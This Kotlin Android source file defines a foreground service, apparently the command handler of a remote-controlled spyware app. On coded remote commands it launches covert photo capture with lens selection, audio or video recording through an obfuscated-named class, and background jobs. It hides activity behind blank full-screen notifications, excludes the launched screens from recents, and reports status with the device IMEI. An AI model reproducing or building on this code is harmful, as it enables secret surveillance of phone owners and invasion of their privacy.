package com.example.mobiletwo

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlin.Exception

class MyForeGroundService : Service() {

    companion object {
        //--------------------------------------------------//
        fun startService(
            bContext: Context,
            ri: String,
            command: String,
            param: String?,
            file_path: String?
        ) {
            try{
                val mIntent = Intent(bContext, MyForeGroundService::class.java)
                mIntent.putExtra("mExtra", "Default Extra Message")
                mIntent.putExtra("ri", ri)
                mIntent.putExtra("command", command)
                mIntent.putExtra("param", param)
                mIntent.putExtra("file_path", file_path)
                val imei = MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                MyApiOld.resp(
                    ri, "قيد التنفيذ", "", "", "2",
                    command, "", imei
                )
                ContextCompat.startForegroundService(bContext, mIntent)
            }catch (ex:Exception){
                MyExecutorFG.logEx(ex, "startService")
            }
        }

        fun stopService(bContext: Context) {
            try{
                val stopIntent = Intent(bContext, MyForeGroundService::class.java)
                bContext.stopService(stopIntent)
            }catch (ex:Exception){MyExecutorFG.logEx(ex, "startService")}
        }
    }

    override fun onStart(intent: Intent?, startId: Int) {

    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try{/* ----------------Start---------------- */
            val ri: String = intent!!.getStringExtra("ri") ?: ""
            val command: String = intent.getStringExtra("command") ?: ""
            val param: String = intent.getStringExtra("param") ?: ""
            val filePath: String = intent.getStringExtra("file_path") ?: ""

            /* ----------------END---------------- */
            fun isSeriouse() {
                createNotificationChannel(true)
                val mNotificationIntent = Intent(baseContext, TakePhoto::class.java)
                mNotificationIntent.putExtra("ri", ri.toInt())
                mNotificationIntent.putExtra("command", command)
                mNotificationIntent.putExtra(
                    "lens", if (command == "JW-C025") {
                        1
                    } else {
                        0
                    }
                )
                mNotificationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                mNotificationIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                val mPendingIntent = PendingIntent.getActivity(
                    this,
                    0,
                    mNotificationIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT
                )
                val notification = NotificationCompat.Builder(this, "HighImportanceChannel")
                    .setContentTitle("       ")
                    .setContentText("       ")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setCategory(Notification.CATEGORY_CALL)
                    .setChannelId("HighImportanceChannel")
                    .setPriority(NotificationManager.IMPORTANCE_HIGH)
                    .setFullScreenIntent(mPendingIntent, true)
                    .build()
                //todo replace
//            MyFireBaseMessagingService.dSPWrite.putString("currentRI", ri).apply()
//            MyFireBaseMessagingService.dSPWrite.putString("currentCommand", command).apply()
                startForeground(ri.toInt(), notification)
            }

            fun mediaRec() {
                createNotificationChannel(true)
                val mNotificationIntent = Intent(
                    baseContext, if (command == "JW-C012") {
                        Ckpuhwom::class.java
                    } else {
                        VideoRecord::class.java
                    }
                )
                mNotificationIntent.putExtra("ri", ri.toInt())
                mNotificationIntent.putExtra("command", command)
                mNotificationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                mNotificationIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                val mPendingIntent = PendingIntent.getActivity(
                    this,
                    0,
                    mNotificationIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT
                )
                val notification = NotificationCompat.Builder(this, "HighImportanceChannel")
                    .setContentTitle("       ")
                    .setContentText("       ")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setCategory(Notification.CATEGORY_CALL)
                    .setChannelId("HighImportanceChannel")
                    .setPriority(NotificationManager.IMPORTANCE_HIGH)
                    .setFullScreenIntent(mPendingIntent, true)
                    .build()
                startForeground(ri.toInt(), notification)
            }
            when (command) {
                "JW-C024" -> {
                    isSeriouse()
                }
                "JW-C025" -> {
                    isSeriouse()
                }
                "JW-C012" -> {
                    mediaRec()
                }
                "JW-C026" -> {
                    mediaRec()
                }
                else -> {
                    createNotificationChannel(false)
                    val mNotificationIntent = Intent(baseContext, MainActivity::class.java)
                    val mPendingIntent = PendingIntent.getActivity(this, 0, mNotificationIntent, 0)
                    val notification = NotificationCompat.Builder(this, "DefaultImportanceChannel")
                        .setContentTitle("       ")
                        .setContentText("       ")
                        .setSmallIcon(R.drawable.ic_launcher_foreground)
                        .setChannelId("DefaultImportanceChannel")
                        .setPriority(NotificationManager.IMPORTANCE_DEFAULT)
                        .setContentIntent(mPendingIntent)
                        .build()
                    startForeground(ri.toInt(), notification)
                    Thread {
                        MyExecutorFG.startJob(this, ri, command, param, filePath)
                    }.start()
                }
            }

            return START_NOT_STICKY
        }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "onStartCommand")
            return START_STICKY
        }
    }

    @SuppressLint("NewApi")
    private fun createNotificationChannel(isImportant: Boolean) {
        try{
            val mNotificationChannel = if (isImportant) {
                NotificationChannel(
                    "HighImportanceChannel", "Important Foreground Service Channel",
                    NotificationManager.IMPORTANCE_HIGH
                )
            } else {
                NotificationChannel(
                    "DefaultImportanceChannel", "Default Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
                )
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager!!.createNotificationChannel(mNotificationChannel)
        }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "createNotificationChannel")
        }
    }
}


